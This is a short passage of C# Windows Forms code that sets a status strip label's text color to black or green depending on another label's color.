			ToolStripStatusLabel6.ForeColor = Color.Black;
		}
		else if (ToolStripStatusLabel2.ForeColor == Color.Green)
		{
			ToolStripStatusLabel6.ForeColor = Color.Green;
		}
	}
}